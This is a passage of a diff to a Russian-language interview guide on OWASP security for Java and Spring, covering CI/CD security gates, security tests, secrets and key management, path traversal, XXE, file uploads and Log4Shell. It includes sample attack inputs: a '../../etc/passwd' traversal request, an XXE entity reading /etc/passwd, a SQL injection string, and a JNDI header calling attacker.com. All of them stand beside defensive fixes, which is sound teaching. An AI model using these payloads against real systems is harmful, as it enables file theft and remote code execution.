+- `IMDSv2` в AWS — требует PUT-запрос с `X-aws-ec2-metadata-token` (защита от SSRF через GET)
+
+---
+
+## Q35. (!) Как встроить OWASP-проверки в SDLC и CI/CD?
+
+OWASP-риски покрываются не одним пентестом, а системой автоматических и ручных проверок на каждом этапе:
+
+```mermaid
+graph LR
+    A[Design] --> B[Development]
+    B --> C[CI/CD]
+    C --> D[Staging]
+    D --> E[Production]
+    
+    A -.-> A1[Threat Modeling]
+    A -.-> A2[Security Requirements]
+    B -.-> B1[Code Review]
+    B -.-> B2[IDE Plugins]
+    C -.-> C1[SAST]
+    C -.-> C2[SCA]
+    C -.-> C3[Secret Scan]
+    C -.-> C4[IaC Scan]
+    D -.-> D1[DAST]
+    D -.-> D2[Pentest]
+    E -.-> E1[WAF]
+    E -.-> E2[Monitoring]
+    E -.-> E3[Bug Bounty]
+```
+
+**Практический CI/CD pipeline:**
+
+| Стадия | Инструмент | Что проверяет | Блокирует MR? |
+|--------|-----------|---------------|---------------|
+| `SAST` | `SpotBugs` + `Find Security Bugs` | SQL injection, XSS, криптография | Да, на High |
+| `SCA` | `OWASP Dependency-Check` | Уязвимые зависимости | Да, на CVSS ≥ 7.0 |
+| `Secrets` | `gitleaks`, `trufflehog` | Утечка секретов в код | Да, всегда |
+| `IaC` | `Checkov`, `tfsec` | Ошибки конфигурации | Да, на High |
+| `Container` | `Trivy` | Уязвимости в образах | Да, на Critical |
+| `DAST` | `OWASP ZAP` | Runtime-уязвимости | Нет (информационно) |
+
+Важно определить **quality gates** — по severity и с возможностью policy exception с явным владельцем риска.
+
+## Q36. Какие security-тесты обязательны перед релизом?
+
+Минимальный набор security-тестов в Java-проекте:
 
 ```java
-@Configuration
-public class HttpClientConfig {
+// 1. Тесты авторизации — positive + negative
+@Test
+void regularUser_cannotAccessAdminEndpoint() {
+    mockMvc.perform(get("/api/admin/users")
+            .with(user("regular").roles("USER")))
+        .andExpect(status().isForbidden());
+}
 
- @Bean
- public RestTemplate restTemplate() {
- // Настройка HttpClient с ограничениями
- HttpClient httpClient = HttpClientBuilder.create().setMaxConnTotal(20).setMaxConnPerRoute(10).setConnectionTimeToLive(30, TimeUnit.SECONDS).build();
+@Test
+void admin_canAccessAdminEndpoint() {
+    mockMvc.perform(get("/api/admin/users")
+            .with(user("admin").roles("ADMIN")))
+        .andExpect(status().isOk());
+}
 
- return new RestTemplate(new HttpComponentsClientHttpRequestFactory(httpClient));
- }
+// 2. Тесты на IDOR
+@Test
+void user_cannotAccessOtherUsersData() {
+    mockMvc.perform(get("/api/accounts/999")  // чужой аккаунт
+            .with(user("user1").roles("USER")))
+        .andExpect(status().isForbidden());
+}
 
- @Bean
- public WebClient webClient() {
- // Настройка WebClient с таймаутами
- return WebClient.builder().clientConnector(new ReactorClientHttpConnector(
- HttpClient.create().responseTimeout(Duration.ofSeconds(10)).doOnConnected(conn -> conn.addHandlerLast(new ReadTimeoutHandler(10)).addHandlerLast(new WriteTimeoutHandler(10))))).build();
- }
+// 3. Тесты на injection
+@Test
+void sqlInjection_doesNotWork() {
+    mockMvc.perform(get("/api/users")
+            .param("search", "' OR '1'='1"))
+        .andExpect(status().isBadRequest());
+}
+
+// 4. Тесты security headers
+@Test
+void securityHeaders_arePresent() {
+    mockMvc.perform(get("/api/public/health"))
+        .andExpect(header().string("X-Content-Type-Options", "nosniff"))
+        .andExpect(header().string("X-Frame-Options", "DENY"))
+        .andExpect(header().exists("Content-Security-Policy"));
 }
 ```
 
-#### 3. `Service Architecture Protection`
+Для критичных систем добавляют threat-based тесты по наиболее вероятным атакам из threat model (см. Q16).
+
+## Q37. Как организовать безопасный секрет-менеджмент?
+
+Секреты **не должны** храниться в коде, `application.yml`, Docker-образах или переменных окружения (env vars видны в `/proc`).
+
+**Иерархия подходов (от простого к надёжному):**
+
+| Подход | Плюсы | Минусы |
+|--------|-------|--------|
+| Env vars | Просто, нет в коде | Видны в `/proc`, нет аудита |
+| `Spring Config Server` (encrypted) | Централизация | Ключ шифрования нужно где-то хранить |
+| `HashiCorp Vault` | Ротация, аудит, lease | Сложность настройки |
+| Cloud KMS (`AWS Secrets Manager`, `GCP Secret Manager`) | Managed, аудит, ротация | Vendor lock-in |
+
+```java
+// Spring Cloud Vault — динамические секреты БД
+@Configuration
+public class VaultConfig {
+    // spring.cloud.vault.database.enabled=true
+    // Vault генерирует временные DB credentials с TTL
+    // При истечении — автоматическая ротация
+}
+```
+
+Ключевые правила:
+- Секрет **никогда** не попадает в git (настроить `pre-commit hook` с `gitleaks`)
+- Секреты **разные** для каждого окружения (dev/staging/prod)
+- **Ротация** — автоматическая, с минимальным TTL
+- **Аудит** — кто, когда и к какому секрету обращался
+- Минимизировать **время жизни** секрета в памяти приложения
+
+## Q38. Как приоритизировать исправление уязвимостей?
+
+Приоритет определяется **бизнес-контекстом**, не только `CVSS`:
+
+```mermaid
+graph TD
+    A[Уязвимость обнаружена] --> B{CVSS score}
+    B -->|9-10 Critical| C{Эксплуатируемая?}
+    B -->|7-8.9 High| D{Публичный сервис?}
+    B -->|4-6.9 Medium| E[SLA: 30 дней]
+    B -->|0-3.9 Low| F[Backlog]
+    
+    C -->|Да| G[Немедленно<br/>SLA: 24 часа]
+    C -->|Нет| H[SLA: 7 дней]
+    D -->|Да| I[SLA: 7 дней]
+    D -->|Нет| J[SLA: 30 дней]
+```
+
+**Факторы приоритизации:**
+- **Exploitability** — есть ли публичный эксплойт?
+- **Attack surface** — публичный API vs внутренний сервис
+- **Data sensitivity** — финансовые данные vs публичный контент
+- **Compensating controls** — WAF, network isolation, monitoring
+- **Blast radius** — что будет скомпрометировано при эксплуатации
+
+> Иногда «Medium» уязвимость в публичном API важнее «Critical» во внутреннем сервисе за VPN.
+
+Практичный подход — **risk-based backlog** с SLA по severity и owner на каждую запись.
+
+## Q39. Что такое Defense in Depth и как применять на практике?
+
+`Defense in Depth` — принцип многоуровневой защиты, где каждый слой работает независимо. Если один слой пробит, следующий всё ещё защищает:
+
+```mermaid
+graph TB
+    subgraph "Уровни защиты"
+        A[WAF / CDN] --> B[Network / Firewall]
+        B --> C[Load Balancer / TLS]
+        C --> D[API Gateway / Rate Limiting]
+        D --> E[Spring Security Filter Chain]
+        E --> F["@PreAuthorize на методах"]
+        F --> G[Business Logic Validation]
+        G --> H[Row Level Security в БД]
+    end
+```
+
+**Пример — защита API перевода денег:**
+
+```java
+// Слой 1: URL-авторизация (SecurityFilterChain)
+.requestMatchers("/api/transfers/**").authenticated()
+
+// Слой 2: метод-авторизация
+@PreAuthorize("hasRole('USER') and #request.fromAccountId == authentication.principal.accountId")
+public TransferResult transfer(TransferRequest request) { ... }
+
+// Слой 3: бизнес-валидация
+if (fromAccount.getBalance().compareTo(amount) < 0) {
+    throw new InsufficientFundsException();
+}
+if (amount.compareTo(fromAccount.getDailyLimit()) > 0) {
+    throw new DailyLimitExceededException();
+}
+
+// Слой 4: аудит
+auditService.log("TRANSFER", fromAccount, toAccount, amount);
+
+// Слой 5: БД constraints
+// CHECK (balance >= 0) на уровне таблицы
+```
+
+Каждый слой защищает от разных сценариев и от ошибок в других слоях.
+
+## Q40. Как подготовиться к вопросам по OWASP на собеседовании?
+
+**Что ожидают от Senior Java Developer:**
+
+1. **Знание всех 10 категорий** — не наизусть определения, а понимание: почему это проблема, как проявляется в Java/Spring, как защищаться
+2. **Практический опыт** — конкретные примеры из своих проектов: «мы нашли IDOR в API заказов и исправили через PermissionEvaluator»
+3. **Код** — умение написать и уязвимый, и исправленный вариант
+4. **Процесс** — как security встроен в SDLC, CI/CD, code review
+5. **Trade-offs** — понимание, что безопасность имеет цену (сложность, производительность, UX)
+
+**Структура ответа на вопрос типа «Расскажите про A01»:**
+1. Что это (1-2 предложения)
+2. Пример уязвимости (код или сценарий)
+3. Как защищаться (конкретные меры)
+4. Как проверять (тесты, инструменты)
+
+**Частые ловушки:**
+- «Мы используем Spring Security, значит защищены» — нет, `Spring Security` защищает аутентификацию и URL-авторизацию, но не от IDOR, injection в native queries, SSRF
+- «У нас есть WAF» — WAF — дополнительный слой, но не замена правильного кода
+- «Мы шифруем пароли через MD5/SHA-256» — это хэширование, не шифрование, и оба варианта небезопасны для паролей
+
+## Q41. (!) Как реализовать Path Traversal защиту в Java?
+
+**Path Traversal** (CWE-22) — атака, при которой злоумышленник использует последовательности `../` для выхода за пределы разрешённого каталога.
+
+### Уязвимый код
+
+```java
+// УЯЗВИМО: прямое использование имени файла из запроса
+@GetMapping("/files/{filename}")
+public ResponseEntity<Resource> downloadFile(@PathVariable String filename) {
+    Path filePath = Paths.get("/var/uploads/" + filename);
+    Resource resource = new FileSystemResource(filePath);
+    return ResponseEntity.ok(resource);
+}
+// Атака: GET /files/../../etc/passwd
+```
+
+### Безопасная реализация
+
+```java
+@GetMapping("/files/{filename}")
+public ResponseEntity<Resource> downloadFile(@PathVariable String filename) {
+    // 1. Нормализуем путь
+    Path baseDir = Paths.get("/var/uploads").toAbsolutePath().normalize();
+    Path requestedFile = baseDir.resolve(filename).normalize();
+
+    // 2. Проверяем, что путь не выходит за пределы базовой директории
+    if (!requestedFile.startsWith(baseDir)) {
+        throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Invalid file path");
+    }
+
+    // 3. Проверяем существование файла
+    if (!Files.exists(requestedFile) || !Files.isRegularFile(requestedFile)) {
+        throw new ResponseStatusException(HttpStatus.NOT_FOUND);
+    }
+
+    // 4. Дополнительно: whitelist допустимых расширений
+    String ext = FilenameUtils.getExtension(filename).toLowerCase();
+    if (!Set.of("pdf", "png", "jpg", "jpeg").contains(ext)) {
+        throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Unsupported file type");
+    }
+
+    Resource resource = new FileSystemResource(requestedFile);
+    return ResponseEntity.ok()
+        .header(HttpHeaders.CONTENT_DISPOSITION,
+            "attachment; filename=\"" + requestedFile.getFileName() + "\"")
+        .body(resource);
+}
+```
+
+### Ключевые меры защиты
+
+| Мера | Реализация |
+|------|-----------|
+| Нормализация пути | `path.normalize()` убирает `../` |
+| Проверка `startsWith` | Гарантирует нахождение в разрешённом каталоге |
+| Whitelist расширений | Запрет опасных типов файлов |
+| Хранение вне `webroot` | Файлы не доступны напрямую через веб |
+| UUID-именование | Замена оригинальных имён на UUID при сохранении |
+
+## Q42. Что такое XXE и как защититься в Java?
+
+**XXE** (XML External Entity Injection, CWE-611) — атака через XML-парсер, который обрабатывает внешние сущности. Позволяет читать локальные файлы, делать SSRF, в редких случаях — RCE.
+
+### Пример атаки
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<user><name>&xxe;</name></user>
+```
+
+### Уязвимый код
+
+```java
+// УЯЗВИМО: SAXParser без отключения внешних сущностей
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+DocumentBuilder db = dbf.newDocumentBuilder();
+Document doc = db.parse(inputStream); // читает /etc/passwd!
+```
+
+### Безопасная конфигурация парсера
+
+```java
+// Безопасный DocumentBuilderFactory
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+// Отключаем DOCTYPE полностью (рекомендуется)
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+// Или точечно — только внешние сущности
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);
+
+DocumentBuilder db = dbf.newDocumentBuilder();
+```
+
+### Jackson XML (Spring Boot)
+
+```java
+// Безопасная конфигурация JacksonXmlModule
+@Bean
+public XmlMapper xmlMapper() {
+    XmlMapper mapper = new XmlMapper();
+    // Jackson 2.x по умолчанию отключает XXE — убедитесь в версии
+    mapper.configure(MapperFeature.DEFAULT_VIEW_INCLUSION, false);
+    return mapper;
+}
+```
+
+**Правило**: всегда явно отключайте `DOCTYPE` в XML-парсерах. В современных Spring Boot приложениях предпочтительнее использовать JSON; если XML обязателен — явно конфигурируйте парсер.
+
+## Q43. (!) Как безопасно обрабатывать загрузку файлов в Spring Boot?
+
+Загрузка файлов — одна из наиболее опасных операций: возможны path traversal, хранение исполняемых файлов, DoS через огромные файлы, XSS через SVG/HTML.
+
+### Конфигурация лимитов
+
+```yaml
+# application.yml
+spring:
+  servlet:
+    multipart:
+      max-file-size: 10MB
+      max-request-size: 12MB
+      enabled: true
+```
+
+### Безопасный контроллер загрузки
 
 ```java
 @RestController
-@RequestMapping("/api/external")
-public class ExternalApiController {
+@RequestMapping("/api/upload")
+public class FileUploadController {
 
- private final UrlValidator urlValidator;
- private final ExternalApiService externalApiService;
+    private static final Set<String> ALLOWED_CONTENT_TYPES =
+        Set.of("image/jpeg", "image/png", "application/pdf");
+    private static final long MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB
+    private final Path uploadDir = Paths.get("/var/uploads");
 
- @GetMapping("/fetch")
- public ResponseEntity<?> fetchExternalData(@RequestParam String url) {
+    @PostMapping
+    public ResponseEntity<String> upload(@RequestParam("file") MultipartFile file)
+            throws IOException {
 
- // Валидация URL
- if (!urlValidator.isValidUrl(url)) {
- return ResponseEntity.badRequest().body("Invalid or forbidden URL");
- }
+        // 1. Проверка типа контента (не доверяем расширению)
+        String contentType = file.getContentType();
+        if (!ALLOWED_CONTENT_TYPES.contains(contentType)) {
+            throw new ResponseStatusException(HttpStatus.BAD_REQUEST,
+                "Unsupported file type: " + contentType);
+        }
 
- try {
- // Использование отдельного сервиса с ограничениями
- String data = externalApiService.fetchData(url);
- return ResponseEntity.ok(data);
+        // 2. Проверка размера (дополнительно к конфигу)
+        if (file.getSize() > MAX_FILE_SIZE) {
+            throw new ResponseStatusException(HttpStatus.PAYLOAD_TOO_LARGE);
+        }
 
- } catch (Exception e) {
- return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body("Error fetching external data");
- }
- }
-}
+        // 3. Генерируем безопасное имя через UUID
+        String ext = switch (contentType) {
+            case "image/jpeg" -> ".jpg";
+            case "image/png" -> ".png";
+            case "application/pdf" -> ".pdf";
+            default -> throw new IllegalStateException();
+        };
+        String safeFilename = UUID.randomUUID() + ext;
 
-@Service
-public class ExternalApiService {
+        // 4. Сохраняем в безопасный путь (с проверкой)
+        Path targetPath = uploadDir.resolve(safeFilename).normalize();
+        if (!targetPath.startsWith(uploadDir)) {
+            throw new ResponseStatusException(HttpStatus.BAD_REQUEST);
+        }
 
- private final RestTemplate restTemplate;
+        // 5. Проверка magic bytes (сигнатуры файла)
+        validateMagicBytes(file.getBytes(), contentType);
 
- public String fetchData(String url) {
- // Дополнительные проверки и ограничения
- if (url.length() > 2048) {
- throw new IllegalArgumentException("URL too long");
- }
+        Files.copy(file.getInputStream(), targetPath,
+            StandardCopyOption.REPLACE_EXISTING);
 
- // Таймаут и ограничения размера ответа
- ResponseEntity<String> response = restTemplate.exchange(
- url, HttpMethod.GET, null, String.class);
+        return ResponseEntity.ok(safeFilename);
+    }
 
- String body = response.getBody();
- if (body!= null && body.length() > 10 * 1024 * 1024) { // 10MB limit
- throw new IllegalArgumentException("Response too large");
- }
-
- return body;
- }
+    private void validateMagicBytes(byte[] bytes, String contentType) {
+        if ("image/jpeg".equals(contentType)) {
+            // JPEG начинается с FF D8 FF
+            if (bytes.length < 3 || bytes[0] != (byte) 0xFF ||
+                bytes[1] != (byte) 0xD8 || bytes[2] != (byte) 0xFF) {
+                throw new ResponseStatusException(HttpStatus.BAD_REQUEST,
+                    "Invalid JPEG signature");
+            }
+        }
+        // Аналогично для PNG: 89 50 4E 47, PDF: 25 50 44 46
+    }
 }
 ```
 
-### Дополнительные меры защиты
+### Дополнительные меры
 
-1. `DNS Resolution Control`: Контроль `DNS` разрешений
-2. `Network Segmentation`: Разделение сети на сегменты
-3. `Rate Limiting`: Ограничение количества запросов
-4. `Monitoring`: Мониторинг исходящих запросов
+- **Антивирусное сканирование**: ClamAV интеграция через `Java API`
+- **Изолированная подсеть**: файловое хранилище в отдельном сегменте сети
+- **CDN/Object Storage**: `S3`, `MinIO` — файлы не на app-сервере
+- **Запрет исполнения**: `noexec` флаг на `/var/uploads`
+
+## Q44. Как работает Log4Shell и почему это критично?
+
+**Log4Shell** (CVE-2021-44228) — критическая уязвимость в `Apache Log4j 2.x` (CVSS 10.0), позволявшая достичь RCE через JNDI lookup в любом логируемом значении.
+
+### Механизм атаки
+
+```
+1. Злоумышленник отправляет HTTP-запрос с заголовком:
+   User-Agent: ${jndi:ldap://attacker.com/exploit}
+
+2. Приложение логирует заголовок: log.info("Request from {}", userAgent)
+
+3. Log4j 2.x обрабатывает ${jndi:...} — делает LDAP lookup
+
+4. LDAP-сервер злоумышленника возвращает ссылку на вредоносный Java-класс
+
+5. JVM загружает и выполняет вредоносный код → RCE
+```
+
+### Почему это важно понимать
+
+```java
+// УЯЗВИМО (Log4j 2.0-2.14.1)
+import org.apache.logging.log4j.LogManager;
+Logger log = LogManager.getLogger();
+log.info("User-Agent: {}", request.getHeader("User-Agent")); // RCE!
+
+// БЕЗОПАСНО: Log4j 2.15.0+ отключает JNDI lookup по умолчанию
+// БЕЗОПАСНО: Logback (SLF4J) не имел этой уязвимости
+// БЕЗОПАСНО: Java util logging (JUL) не имел этой уязвимости
+```
+
+### Уроки для разработчика
+
+1. **Мониторинг уязвимостей зависимостей** — SBOM + SCA tools (`OWASP Dependency-Check`, `Snyk`)
+2. **Быстрая реакция** — процедура экстренного обновления зависимостей
+3. **Принцип минимальных привилегий** — даже при RCE ограниченный пользователь снижает ущерб
+4. **Egress filtering** — блокировка исходящих соединений с app-сервера снижает риск
+
+```xml
+<!-- pom.xml: всегда актуальная версия Log4j -->
+<dependency>
+    <groupId>org.apache.logging.log4j</groupId>
+    <artifactId>log4j-core</artifactId>
+    <version>2.24.3</version> <!-- минимум 2.17.1 для fix Log4Shell -->
+</dependency>
+```
+
+## Q45. Как реализовать безопасную работу с Cryptographic Keys в Java?
+
+Неправильное управление ключами — одна из самых частых криптографических ошибок (OWASP A02).
+
+### Антипаттерны
+
+```java
+// ПЛОХО: ключ в исходном коде
+private static final String SECRET_KEY = "my-secret-key-123";
+
+// ПЛОХО: ключ в environment variable (виден в ps aux, docker inspect)
+String key = System.getenv("ENCRYPTION_KEY");
+
+// ПЛОХО: слабый ключ
+SecretKey key = new SecretKeySpec("password".getBytes(), "AES"); // 8 байт < 128 бит
+```
+
+### Правильная работа с ключами
+
+```java
+// 1. Генерация криптографически стойкого ключа
+KeyGenerator keyGen = KeyGenerator.getInstance("AES");
+keyGen.init(256, new SecureRandom()); // 256-битный ключ
+SecretKey secretKey = keyGen.generateKey();
+
+// 2. Хранение в Java KeyStore
+KeyStore ks = KeyStore.getInstance("PKCS12");
+ks.load(null, null); // создать новый
+ks.setKeyEntry("mykey", secretKey, "keyPassword".toCharArray(),
+    new Certificate[0]);
+// Сохранение в файл (защищённый паролем)
+try (var fos = new FileOutputStream("keystore.p12")) {
+    ks.store(fos, "storePassword".toCharArray());
+}
+
+// 3. Загрузка из KeyStore
+KeyStore ks = KeyStore.getInstance("PKCS12");
+try (var fis = new FileInputStream("keystore.p12")) {
+    ks.load(fis, "storePassword".toCharArray());
+}
+SecretKey key = (SecretKey) ks.getKey("mykey", "keyPassword".toCharArray());
+```
+
+### HashiCorp Vault интеграция в Spring Boot
+
+```yaml
+# application.yml
+spring:
+  cloud:
+    vault:
+      host: vault.example.com
+      port: 8200
+      scheme: https
+      authentication: KUBERNETES # или TOKEN, AWS_EC2
+      kubernetes:
+        role: my-app
+      kv:
+        enabled: true
+        backend: secret
+        default-context: my-app
+```
+
+```java
+// Использование секретов из Vault
+@Value("${encryption.key}")
+private String encryptionKey; // автоматически подтягивается из Vault
+
+// Или через VaultTemplate для динамических секретов
+@Autowired
+private VaultTemplate vaultTemplate;
+
+public String getDbPassword() {
+    VaultResponse response = vaultTemplate.read("database/creds/my-role");
+    return (String) response.getData().get("password");
+}
+```
+
+### Принципы управления ключами
+
+| Принцип | Реализация |
+|---------|-----------|
+| Separation of duties | Ключи отдельно от приложения |
+| Key rotation | Регулярная ротация (Vault TTL, k8s Secret rotation) |
+| Least privilege | Каждый сервис — свой ключ с минимальными правами |
+| Audit trail | Логирование доступа к ключам |
+| HSM для prod | Hardware Security Module для критичных ключей |
+
+---
+
+## See also
+
+- [Безопасность приложений](application-security-interview.md) — общие принципы AppSec, Defense in Depth
+- [Паттерны аутентификации и авторизации](authentication-authorization-patterns-interview.md) — RBAC, ABAC, Zero Trust
+- [OAuth 2.0 и OpenID Connect](oauth2-interview.md) — авторизационные flows, JWT, токены
+- [Spring Security](../frameworks/spring/spring-security-interview.md) — реализация безопасности в Spring
+- [Микросервисы](../architecture/microservices-interview.md) — безопасность в распределённых системах, service mesh
+- [Распределённые системы](../architecture/distributed-systems-interview.md) — безопасность на уровне инфраструктуры
+- [Kubernetes](../devops/kubernetes-interview.md) — Pod Security, Network Policy, Secrets
+- [HTTP и REST](../api/http-rest-interview.md) — security headers, CORS, TLS
